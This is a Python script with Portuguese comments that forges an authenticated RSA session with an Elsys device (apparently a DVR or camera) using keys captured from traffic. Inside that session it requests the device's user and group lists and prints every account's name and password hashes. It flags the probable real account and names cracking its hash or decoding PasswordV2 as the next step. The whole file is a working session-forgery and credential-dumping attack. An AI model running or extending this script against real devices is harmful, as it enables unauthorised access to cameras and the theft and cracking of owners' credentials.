# -*- coding: utf-8 -*-
"""
elsys_users.py  -  Forja a sessao RSA da Elsys e pede a lista de contas (Users,
                   msg 1470) e grupos, DENTRO da sessao. Mostra nome + hash de
                   cada conta - inclusive a conta real (a de 4 letras).

Uso (sessao INICIAR_SESSAO.bat FECHADA):
  python ferramentas\\elsys_users.py 192.168.3.119
"""
import argparse
import json
import os
import sys

RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, RAIZ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import elsys_conta_rapido as ecr  # noqa: E402  (forja, cmd)


def tenta(sock, session, msgid, nome):
    r = ecr.cmd(sock, session, msgid, '{"Name":"%s","SessionID":"0x%08X"}' % (nome, session))
    print("  %s (msg %d) -> %s" % (nome, msgid, json.dumps(r, ensure_ascii=False)[:600] if r else r))
    return r


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("ip")
    ap.add_argument("--tentativas", type=int, default=60)
    args = ap.parse_args()

    base = os.path.dirname(os.path.abspath(__file__))
    mat = json.load(open(os.path.join(base, "elsys_multi_%s.json" % args.ip.replace(".", "_"))))
    abre = open(os.path.join(base, "elsys_%s_abre.bin" % args.ip.replace(".", "_")), "rb").read()

    print("=" * 64)
    print(" ELSYS dump de contas  -  %s" % args.ip)
    print("=" * 64)
    print("[1] Forjando ...")
    sock, session = ecr.forja(args.ip, mat["chaves"], abre, args.tentativas)
    if not sock:
        print("    [X] nenhuma chave casou. Faca captura PCAPdroid nova.")
        sys.exit(2)
    print("    OK (SID=0x%08X)." % session)

    print("[2] Pedindo configuracoes de conta ...")
    r = None
    for msgid, nome in [(1470, "Users"), (1472, "Groups"), (1042, "Users"),
                        (1042, "System.ExUserMap"), (1042, "RandomUser")]:
        rr = tenta(sock, session, msgid, nome)
        if nome == "Users" and rr and rr.get("Users"):
            r = rr
    try:
        sock.close()
    except Exception:
        pass

    if r and r.get("Users"):
        print("\n[3] Contas:")
        reais = []
        for u in r["Users"]:
            nome = u.get("Name")
            print("    - %-10s grupo=%-7s memo=%-22r Password=%s  PasswordV2=%s"
                  % (nome, u.get("Group"), u.get("Memo", ""), u.get("Password"), u.get("PasswordV2")))
            if nome != "admin" and ("account" in str(u.get("Memo", "")).lower() or len(str(nome)) == 4):
                reais.append(u)
        if reais:
            u = reais[0]
            print("\n    >>> conta real provavel: %s  (hash=%s)" % (u.get("Name"), u.get("Password")))
            print("        Proximo passo: quebrar esse hash (--crack no elsys_conta ... ) ou")
            print("        decodificar PasswordV2. Me mande esta saida.")
    else:
        print("\n    [!] Nao veio lista de Users. Veja as respostas acima (pode ser outro Name/msgid).")
    print("=" * 64)


if __name__ == "__main__":
    main()
